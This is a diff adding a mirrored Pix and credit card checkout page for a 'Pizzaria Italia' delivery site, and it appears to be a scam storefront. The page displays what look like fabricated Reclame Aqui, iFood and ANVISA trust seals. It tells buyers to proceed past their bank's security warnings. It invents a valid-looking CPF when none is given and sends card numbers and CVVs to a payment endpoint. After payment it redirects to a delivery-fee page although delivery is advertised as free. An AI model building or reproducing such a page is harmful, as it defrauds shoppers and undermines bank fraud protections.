@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from pizzarevoitalia.lovable.app/pagamento.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Aug 2026 04:41:38 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'../connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1063660512841116');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1063660512841116&amp;ev=PageView&amp;noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento PIX | Pizzaria Italia</title>
+<link rel="stylesheet" href="css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Inter',sans-serif;background:#fcfbf8;color:#111;padding-bottom:32px}
+  .topbar{background:#fff;box-shadow:0 1px 0 #ececec;height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;position:sticky;top:0;z-index:200}
+  .topbar-back{width:36px;height:36px;border-radius:50%;background:#f2f2f2;display:flex;align-items:center;justify-content:center;color:#333;text-decoration:none;font-size:14px}
+  .topbar-title{flex:1;text-align:center}
+  .topbar-title strong{color:#111;font-size:15px;font-weight:800;display:block}
+  .topbar-title span{color:#999;font-size:11px;font-weight:600}
+  .topbar-lock{width:36px;color:#bbb;text-align:center}
+  .hero{background:#fff;border-bottom:1px solid #f0f0f0;padding:22px 20px 20px;text-align:center}
+  .hero-brand{display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:12px;color:#777;font-size:12px;font-weight:700}
+  .hero-brand i{color:#32bcad;font-size:20px}
+  .hero-valor{font-size:36px;font-weight:900;color:#111;letter-spacing:-1.2px;line-height:1;margin-bottom:12px}
+  .hero-valor sup{font-size:16px;font-weight:700;vertical-align:top;margin-top:8px;margin-right:3px;color:#333}
+  .hero-status{display:inline-flex;align-items:center;gap:7px;background:#fff8e1;border:1px solid #ffe082;border-radius:24px;padding:6px 14px;font-size:12px;font-weight:700;color:#b8860b}
+  .hero-status.pago{background:#e8f5e9;border-color:#a5d6a7;color:#2e7d32}
+  .hero-status .dot{width:7px;height:7px;border-radius:50%;background:#ffc107;animation:ping 1.5s cubic-bezier(0,0,.2,1) infinite}
+  .hero-status.pago .dot{background:#4caf50;animation:none}
+  @keyframes ping{0%{box-shadow:0 0 0 0 rgba(255,193,7,.6)}70%{box-shadow:0 0 0 8px rgba(255,193,7,0)}100%{box-shadow:0 0 0 0 rgba(255,193,7,0)}}
+  .container{padding:16px 14px 48px;max-width:480px;margin:0 auto}
+  .card{background:#fff;border-radius:16px;box-shadow:0 1px 6px rgba(0,0,0,.06);padding:18px;margin-bottom:12px}
+  .card h3{font-size:13px;font-weight:800;color:#222;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px;display:flex;align-items:center;gap:7px}
+  .card h3 i{color:#006437}
+  .qr-box{display:flex;justify-content:center;padding:14px;background:#fafafa;border-radius:12px;border:1px dashed #e5e7eb;margin-bottom:12px}
+  .qr-box img{width:230px;height:230px;background:#fff;border-radius:10px;padding:6px}
+  .pix-code{background:#f6f6f6;border-radius:10px;padding:12px;font-size:12px;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#333;margin-bottom:12px;position:relative}
+  .btn-copy{width:100%;padding:14px;background:linear-gradient(135deg,#006437 0%,#00522d 100%);color:#fff;border:none;border-radius:12px;font-weight:900;font-size:14px;text-transform:uppercase;letter-spacing:.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 14px rgba(0,100,55,.3)}
+  .btn-copy:active{transform:scale(.98)}
+  .btn-copy.copiado{background:#16a34a}
+  .timer{text-align:center;font-size:12px;color:#777;margin-top:10px;font-weight:700}
+  .timer b{color:#dc2626;font-size:14px}
+  .instrucoes{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:12px 14px;font-size:12.5px;color:#166534;margin-bottom:12px;line-height:1.5}
+  .instrucoes ol{margin:6px 0 0 18px}
+  .instrucoes li{margin-bottom:3px}
+  .resumo-linha{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;color:#555;border-bottom:1px dashed #eee}
+  .resumo-linha:last-child{border-bottom:none;font-weight:900;color:#006437;font-size:15px;padding-top:10px;border-top:2px solid #f0f0f0;margin-top:6px}
+  .endereco{font-size:12px;color:#555;line-height:1.5}
+  .endereco strong{color:#111;display:block;margin-bottom:2px;font-size:13px}
+  .alert-copiado{display:none;background:#dcfce7;color:#166534;padding:10px 14px;border-radius:10px;font-size:12px;font-weight:700;text-align:center;margin-bottom:10px;border:1px solid #bbf7d0}
+  .mapa-endereco{display:flex;gap:8px;align-items:flex-start;padding:14px 16px;font-size:13.5px;font-weight:600;color:#333;line-height:1.4}
+  .mapa-endereco i{color:#dc2626;font-size:16px;margin-top:1px}
+  .mapa-wrap{position:relative;height:230px;background:#eee}
+  .mapa-wrap iframe{width:100%;height:100%;border:0;display:block}
+  .cupom{background:#fdf8e6;border-radius:6px;box-shadow:0 2px 10px rgba(0,0,0,.08);padding:26px 20px;margin-bottom:12px;font-family:'Courier New',Courier,monospace;color:#3a3226;font-size:13px;line-height:1.7}
+  .cupom-head{text-align:center;font-weight:700;letter-spacing:1px}
+  .cupom-date{text-align:center;margin-top:2px}
+  .cupom-sep{border-top:1px dashed #b9ae93;margin:16px 0}
+  .cupom-linha{display:flex;justify-content:space-between;gap:12px}
+  .cupom-linha span:first-child{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .cupom-total{font-weight:700}
+  .cupom-bloco div{white-space:pre-wrap}
+  .cupom-foot{letter-spacing:.5px}
+  .selos{display:flex;flex-direction:column;gap:10px;margin-bottom:12px}
+  .selo{background:#fff;border-radius:14px;box-shadow:0 1px 6px rgba(0,0,0,.06);padding:14px;display:flex;gap:12px;align-items:center}
+  .selo-logo{width:56px;height:56px;flex:0 0 56px;border-radius:12px;background:#fff;border:1px solid #f0f0f0;display:flex;align-items:center;justify-content:center;overflow:hidden}
+  .selo-logo img{width:100%;height:100%;object-fit:contain;padding:4px}
+
+  .selo-txt strong{display:block;font-size:14.5px;font-weight:800;color:#111;margin-bottom:2px}
+  .selo-txt p{font-size:13px;color:#6b7280;line-height:1.45}
+  .selo-txt .ok{color:#16a34a;font-style:normal;font-weight:800}
+  .selo-txt b{color:#374151}
+
+
+</style>
+</head>
+<body>
+<header class="topbar">
+  <a href="checkout.html" class="topbar-back"><i class="fas fa-arrow-left"></i></a>
+  <div class="topbar-title"><strong>Pagamento PIX</strong><span>Pizzaria Italia</span></div>
+  <div class="topbar-lock"><i class="fas fa-lock"></i></div>
+</header>
+
+<div id="pixLoader" style="position:fixed;inset:0;z-index:9999;background:rgba(255,255,255,.97);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;text-align:center;padding:24px">
+  <div style="position:relative;width:86px;height:86px">
+    <div style="position:absolute;inset:0;border:5px solid #fee2e2;border-top-color:#dc2626;border-radius:50%;animation:pixspin .9s linear infinite"></div>
+    <i class="fab fa-pix" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:30px;color:#dc2626"></i>
+  </div>
+  <div>
+    <div style="font-size:17px;font-weight:800;color:#111827">Gerando seu PIX...</div>
+    <div id="pixLoaderMsg" style="font-size:13px;color:#6b7280;margin-top:6px">Preparando o QR Code e o codigo copia e cola</div>
+  </div>
+  <div style="display:flex;gap:6px">
+    <span class="pixdot" style="animation-delay:0s"></span>
+    <span class="pixdot" style="animation-delay:.15s"></span>
+    <span class="pixdot" style="animation-delay:.3s"></span>
+  </div>
+</div>
+<style>
+@keyframes pixspin{to{transform:rotate(360deg)}}
+@keyframes pixbounce{0%,100%{opacity:.25;transform:translateY(0)}50%{opacity:1;transform:translateY(-5px)}}
+.pixdot{width:8px;height:8px;border-radius:50%;background:#dc2626;display:inline-block;animation:pixbounce 1s infinite}
+</style>
+
+<section class="hero">
+  <div class="hero-brand"><i class="fab fa-pix"></i> <span id="paymentLabel">Pague via PIX</span></div>
+  <div class="hero-valor"><sup>R$</sup><span id="displayTotal">0,00</span></div>
+  <div id="heroStatus" class="hero-status"><span class="dot"></span><span id="heroStatusText">Aguardando pagamento</span></div>
+  <div class="timer">Expira em <b id="timerValue">10:00</b></div>
+</section>
+
+<div class="container">
+  <div class="alert-copiado" id="alertCopiado"><i class="fas fa-check-circle"></i> Codigo PIX copiado! Cole no app do seu banco.</div>
+
+  <div class="card" id="qrCodeCard">
+    <h3><i class="fas fa-qrcode"></i> Escaneie o QR Code</h3>
+    <div class="qr-box"><img id="qrImage" alt="QR Code PIX"></div>
+    <h3 style="margin-top:14px"><i class="fas fa-copy"></i> Ou copie o codigo</h3>
+    <div class="pix-code" id="pixCode" style="user-select: all; cursor: text;">Gerando...</div>
+    <button class="btn-copy" id="btnCopy" onclick="copiar()"><i class="fas fa-copy"></i> <span id="textoBotao">Copiar codigo PIX</span></button>
+    
+    <!-- Aviso de Seguranca -->
+    <div style="background-color: #fffbeb; border: 1px solid #fef3c7; border-left: 4px solid #f59e0b; border-radius: 8px; padding: 12px 14px; margin-top: 14px; display: flex; gap: 10px; align-items: flex-start;">
+      <i class="fas fa-exclamation-circle" style="color: #d97706; font-size: 16px; margin-top: 2px; flex-shrink: 0;"></i>
+      <div style="font-size: 12px; color: #78350f; line-height: 1.5; text-align: left; font-weight: 500;">
+        Eventualmente, seu banco pode exibir um aviso de segurança ao realizar o Pix. Isso ocorre devido aos sistemas de proteção da instituição financeira. Se os dados estiverem corretos, você pode prosseguir normalmente. Sua compra é segura.
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="instructionsCard">
+    <h3><i class="fas fa-info-circle"></i> Como pagar</h3>
+    <div class="instrucoes">
+      <ol>
+        <li>Abra o app do seu banco</li>
+        <li>Escolha pagar via PIX com QR Code ou Copia e Cola</li>
+        <li>Confirme o valor e finalize o pagamento</li>
+        <li>Assim que confirmado, seu pedido entra em preparo</li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="cupom">
+    <div class="cupom-head">*** Pizzaria Italia ***</div>
+    <div class="cupom-date" id="cupomData"></div>
+    <div class="cupom-sep"></div>
+    <div id="resumoItens"></div>
+    <div class="cupom-sep"></div>
+    <div class="cupom-linha cupom-total"><span>TOTAL</span><span id="resumoTotal">R$ 0,00</span></div>
+    <div class="cupom-sep"></div>
+    <div class="cupom-bloco">
+      <div>Endereço de entrega</div>
+      <div id="cupomNome"></div>
+      <div id="cupomRua"></div>
+      <div id="cupomBairro"></div>
+    </div>
+    <div class="cupom-sep"></div>
+    <div class="cupom-foot">OBRIGADO PELA PREFERÊNCIA!</div>
+  </div>
+
+  <div class="selos">
+    <div class="selo">
+      <div class="selo-logo"><img src="img/selos/reclameaqui.png" alt="Reclame Aqui"></div>
+      <div class="selo-txt">
+        <strong>Reclame Aqui</strong>
+        <p>Atendimento avaliado como <em class="ok">ÓTIMO</em>. Nota <b>9,9/10</b> nos últimos 6 meses.</p>
+      </div>
+    </div>
+    <div class="selo">
+      <div class="selo-logo"><img src="img/selos/ifood.png" alt="iFood Parceiros"></div>
+      <div class="selo-txt">
+        <strong>iFood Parceiros</strong>
+        <p>Empresa parceira verificada — cadastro ativo e regularizado.</p>
+      </div>
+    </div>
+    <div class="selo">
+      <div class="selo-logo"><img src="img/selos/anvisa.png" alt="ANVISA"></div>
+      <div class="selo-txt">
+        <strong>ANVISA</strong>
+        <p>Essa empresa possui o selo de autorização para funcionamento <b>ANVISA</b>.</p>
+      </div>
+    </div>
+  </div>
+
+
+
+
+
+
+
+  <div class="card" style="padding:0;overflow:hidden">
+    <div class="mapa-endereco"><i class="fas fa-map-marker-alt"></i> <span id="mapaEnderecoTexto">Carregando endereco...</span></div>
+    <div class="mapa-wrap"><iframe id="mapaFrame" title="Local de entrega" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe></div>
+  </div>
+</div>
+
+
+<script>
+const CHECKOUT_KEY='pizza_checkout_v1';
+const data=(()=>{try{return JSON.parse(localStorage.getItem(CHECKOUT_KEY)||'{}')}catch(e){return{}}})();
+if(!data.orderId){location.replace('carrinho.html')}
+const money=v=>Number(v||0).toFixed(2).replace('.',',');
+
+document.getElementById('displayTotal').textContent=money(data.total);
+document.getElementById('paymentLabel').textContent=data.paymentMethod==='CREDIT_CARD'?'Pagamento com Cartão':'Pague via PIX';
+if(data.paymentMethod==='CREDIT_CARD'){
+  document.querySelector('.hero-brand i').className='fas fa-credit-card';
+}
+document.getElementById('resumoTotal').textContent='R$ '+money(data.total);
+let resumoItensHTML = (data.items||[]).map(i=>`<div class="cupom-linha"><span>${i.qty||1}X ${(i.plan||'Item').toUpperCase()}</span><span>R$ ${money(Number(i.total||0)*(i.qty||1))}</span></div>`).join('');
+if (data.churrosBumpAdded) {
+  resumoItensHTML += `<div class="cupom-linha"><span>1X 10 MINI CHURROS</span><span>R$ 11,90</span></div>`;
+}
+if (data.brownieBumpAdded) {
+  resumoItensHTML += `<div class="cupom-linha"><span>1X 5 BROWNIES</span><span>R$ 7,90</span></div>`;
+}
+resumoItensHTML += `<div class="cupom-linha"><span>ENTREGA</span><span>GRATIS</span></div>`;
+document.getElementById('resumoItens').innerHTML = resumoItensHTML;
+(function(){
+  const d=new Date();
+  const p=n=>String(n).padStart(2,'0');
+  document.getElementById('cupomData').textContent=`${p(d.getDate())}/${p(d.getMonth()+1)}/${d.getFullYear()} | ${p(d.getHours())}:${p(d.getMinutes())}`;
+  document.getElementById('cupomNome').textContent=data.nome||'';
+  document.getElementById('cupomRua').textContent=[data.rua,data.numero].filter(Boolean).join(', ');
+  document.getElementById('cupomBairro').textContent=[data.bairro,data.cidade].filter(Boolean).join(' · ');
+})();
+
+
+function esconderLoader(){
+  const el=document.getElementById('pixLoader');
+  if(!el)return;
+  el.style.transition='opacity .35s ease';
+  el.style.opacity='0';
+  setTimeout(()=>el.remove(),350);
+}
+setTimeout(()=>{const m=document.getElementById('pixLoaderMsg');if(m)m.textContent='Quase la, conectando ao banco...';},4000);
+
+// PIX real via Blackcat
+let pix='';
+let paymentId='';
+function gerarPix(){
+  const isCard = data.paymentMethod === 'CREDIT_CARD';
+  
+  // Expiry parsing MM/AA
+  let expirationMonth = '';
+  let expirationYear = '';
+  if (isCard && data.cardExpiry) {
+    const parts = data.cardExpiry.split('/');
+    if (parts.length === 2) {
+      expirationMonth = parts[0].trim();
+      expirationYear = '20' + parts[1].trim();
+    }
+  }
+
+  // Fallback email
+  const cleanName = (data.nome || 'Cliente').replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
+  const cleanPhone = (data.whatsapp || data.telefone || '11999999999').replace(/\D/g, '');
+  const customerEmail = `${cleanName || 'cliente'}_${cleanPhone}@pizzaria.com.br`;
+
+  // CPF / Document handling
+  function gerarCPFValido() {
+    const numAleatorio = () => Math.floor(Math.random() * 9);
+    const n = Array.from({length: 9}, numAleatorio);
+    let d1 = n.reduce((acc, val, idx) => acc + (val * (10 - idx)), 0);
+    d1 = 11 - (d1 % 11);
+    if (d1 >= 10) d1 = 0;
+    n.push(d1);
+    let d2 = n.reduce((acc, val, idx) => acc + (val * (11 - idx)), 0);
+    d2 = 11 - (d2 % 11);
+    if (d2 >= 10) d2 = 0;
+    n.push(d2);
+    return n.join('');
+  }
+
+  let docNumber = (data.cpf || '').replace(/\D/g, '');
+  let docType = 'cpf';
+  if (docNumber.length === 14) {
+    docType = 'cnpj';
+  } else if (docNumber.length !== 11) {
+    docNumber = gerarCPFValido();
+    docType = 'cpf';
+  }
+
+  // Items formatting with random order identifier for unique PIX generation
+  const randomSuffix = Math.random().toString(36).substring(2, 11);
+  const randomOrderName = `Pedido order_${Date.now()}_${randomSuffix}`;
+  
+  const items = [];
+  let basePrice = Number(data.total || 0);
+  if (data.churrosBumpAdded) basePrice -= 11.90;
+  if (data.brownieBumpAdded) basePrice -= 7.90;
+  
+  items.push({
+    title: randomOrderName,
+    quantity: 1,
+    unitPrice: Math.round(basePrice * 100),
+    tangible: false
+  });
+  
+  if (data.churrosBumpAdded) {
+    items.push({
+      title: '10 Mini Churros',
+      quantity: 1,
+      unitPrice: 1190,
+      tangible: false
+    });
+  }
+  
+  if (data.brownieBumpAdded) {
+    items.push({
+      title: '5 Brownies',
+      quantity: 1,
+      unitPrice: 790,
+      tangible: false
+    });
+  }
+
+  // Request Body
+  const reqBody = {
+    amount: Math.round(Number(data.total || 0) * 100),
+    currency: 'BRL',
+    paymentMethod: isCard ? 'credit_card' : 'pix',
+    items: items,
+    customer: {
+      name: data.nome || 'Cliente',
+      email: customerEmail,
+      phone: cleanPhone,
+      document: {
+        number: docNumber,
+        type: docType
+      }
+    },
+    shipping: {
+      name: data.nome || 'Cliente',
+      street: data.rua || 'Rua Principal',
+      number: data.numero || 'SN',
+      complement: data.complemento || '',
+      neighborhood: data.bairro || 'Centro',
+      city: data.cidade || 'Cidade',
+      state: data.uf || 'SP',
+      zipCode: (data.cep || '01001000').replace(/\D/g, '')
+    },
+    externalRef: data.orderId || ('ORDER-' + Date.now()),
+    device: {
+      http_browser_language: navigator.language || 'pt-BR',
+      http_browser_color_depth: window.screen.colorDepth || 24
+    }
+  };
+
+  if (isCard) {
+    reqBody.card = {
+      number: data.cardNumber.replace(/\D/g,''),
+      holderName: data.cardName || data.nome || 'JOAO SILVA',
+      expiryMonth: expirationMonth,
+      expiryYear: expirationYear,
+      cvv: data.cardCvv,
+      installments: 1
+    };
+  } else {
+    reqBody.pix = {
+      expiresInDays: 1
+    };
+  }
+
+  fetch('/api/blackcat/create-sale',{
+    method:'POST',
+    headers:{
+      'Content-Type':'application/json'
+    },
+    body:JSON.stringify(reqBody)
+  })
+  .then(r=>r.json())
+  .then(j=>{
+    if (!j || !j.success || !j.data) {
+      throw new Error(j.message || j.error || 'Erro na criação da venda');
+    }
+    
+    paymentId = j.data.transactionId;
+
+    if (j.data.status === 'PAID') {
+      document.getElementById('heroStatusText').textContent = 'Pagamento confirmado!';
+      const box = document.getElementById('heroStatus');
+      if (box) box.classList.add('pago');
+      esconderLoader();
+      setTimeout(() => {
+        window.location.href = 'taxa-entrega.html';
+      }, 2500);
+      return;
+    }
+
+    if (j.data.status === 'PENDING_3DS') {
+      document.getElementById('heroStatusText').textContent = 'Autenticação 3D Secure necessária...';
+      esconderLoader();
+      if (j.data.invoiceUrl) {
+        setTimeout(() => {
+          window.location.href = j.data.invoiceUrl;
+        }, 1500);
+      } else {
+        alert('Autenticação 3D Secure necessária, mas URL de fatura não encontrada.');
+      }
+      return;
+    }
+
+    if (isCard) {
+      if (j.data.status === 'FAILED') {
+        throw new Error(j.data.refusedReason?.description || 'Cartão recusado');
+      }
+      const qrBox = document.getElementById('qrImage') ? document.getElementById('qrImage').parentElement : null;
+      if (qrBox) qrBox.remove();
+      const codeBox = document.getElementById('pixCode') ? document.getElementById('pixCode').parentElement : null;
+      if (codeBox) codeBox.remove();
+      document.getElementById('heroStatusText').textContent = 'Processando cartão...';
+    } else {
+      pix = j.data.paymentData.copyPaste;
+      
+      const codeEl = document.getElementById('pixCode');
+      if (codeEl) {
+        codeEl.textContent = pix;
+        codeEl.style.padding = '12px';
+        codeEl.style.background = '#fcf8e3';
+        codeEl.style.border = '1px solid #faebcc';
+        codeEl.style.color = '#8a6d3b';
+        codeEl.style.fontWeight = '700';
+        codeEl.style.fontSize = '13px';
+      }
+
+      const qrImg = document.getElementById('qrImage');
+      if (qrImg) {
+        qrImg.src = j.data.paymentData.qrCodeBase64 || ('https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=' + encodeURIComponent(pix));
+      }
+    }
+    
+    if (paymentId) iniciarChecagem();
+    esconderLoader();
+  })
+  .catch((err)=>{
+    console.error('Erro ao gerar pagamento:', err);
+    const codeEl = document.getElementById('pixCode');
+    if (codeEl) {
+      codeEl.textContent = 'Erro ao processar o pagamento com Blackcat: ' + err.message;
+      codeEl.style.color = '#dc2626';
+      codeEl.style.background = '#fef2f2';
+    }
+    const qrImg = document.getElementById('qrImage');
+    if (qrImg) qrImg.alt = 'Erro ao carregar pagamento';
+    esconderLoader();
+  });
+}
+gerarPix();
+
+function iniciarChecagem(){
+  const t=setInterval(()=>{
+    if (!paymentId) return;
+    fetch('/api/blackcat/sale-status?id=' + encodeURIComponent(paymentId), {
+      method: 'GET'
+    })
+      .then(r=>r.json())
+      .then(j=>{
+        if(j && j.success && j.data && j.data.status === 'PAID'){
+          clearInterval(t);
+          const box=document.getElementById('heroStatus');
+          if (box) box.classList.add('pago');
+          document.getElementById('heroStatusText').textContent='Pagamento confirmado!';
+          if(typeof fbq==='function'){
+            fbq('track','Purchase',{value:Number(data.total||0).toFixed(2),currency:'BRL',content_type:'product',transaction_id:data.orderId||''});
+          }
+          setTimeout(()=>{window.location.href='taxa-entrega.html'},2500);
+        }
+      })
+      .catch(()=>{});
+  },6000);
+}
+
+function copiar(){
+  if(!pix)return;
+  navigator.clipboard.writeText(pix).then(()=>{
+    document.getElementById('textoBotao').textContent='COPIADO!';
+    document.getElementById('btnCopy').classList.add('copiado');
+    document.getElementById('alertCopiado').style.display='block';
+    setTimeout(()=>{document.getElementById('textoBotao').textContent='Copiar codigo PIX';document.getElementById('btnCopy').classList.remove('copiado');document.getElementById('alertCopiado').style.display='none'},3000);
+  });
+}
+
+// Countdown 10 min
+let s=10*60;
+const tv=document.getElementById('timerValue');
+setInterval(()=>{if(s<=0)return;s--;const m=String(Math.floor(s/60)).padStart(2,'0'),ss=String(s%60).padStart(2,'0');tv.textContent=m+':'+ss},1000);
+
+// Mapa do endereco real do cliente
+(function(){
+  const partes=[];
+  if(data.rua)partes.push(data.rua+(data.numero?', '+data.numero:''));
+  if(data.bairro)partes.push(data.bairro);
+  if(data.cidade)partes.push(data.cidade+(data.uf?'/'+data.uf:''));
+  const textoEndereco=partes.join(' - ')||'Endereco nao informado';
+  document.getElementById('mapaEnderecoTexto').textContent=textoEndereco;
+
+  const busca=[data.rua&&data.numero?data.rua+' '+data.numero:data.rua,data.bairro,data.cidade,data.uf,data.cep,'Brasil'].filter(Boolean).join(', ');
+  const frame=document.getElementById('mapaFrame');
+  const setBBox=(lat,lon)=>{
+    const d=0.004;
+    frame.src='https://www.openstreetmap.org/export/embed.html?bbox='+(lon-d)+'%2C'+(lat-d)+'%2C'+(lon+d)+'%2C'+(lat+d)+'&layer=mapnik&marker='+lat+'%2C'+lon;
+  };
+  if(!busca||busca==='Brasil'){frame.src='https://www.openstreetmap.org/export/embed.html?bbox=-46.75%2C-23.70%2C-46.50%2C-23.50&amp;layer=mapnik';return}
+  fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q='+encodeURIComponent(busca))
+    .then(r=>r.json())
+    .then(j=>{
+      if(j&&j[0])setBBox(parseFloat(j[0].lat),parseFloat(j[0].lon));
+      else return fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q='+encodeURIComponent([data.bairro,data.cidade,'Brasil'].filter(Boolean).join(', '))).then(r=>r.json()).then(j2=>{if(j2&&j2[0])setBBox(parseFloat(j2[0].lat),parseFloat(j2[0].lon))});
+    })
+    .catch(()=>{});
+})();
+
+</script>
+</body>
+
+<!-- Mirrored from pizzarevoitalia.lovable.app/pagamento.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Aug 2026 04:41:39 GMT -->
+</html>
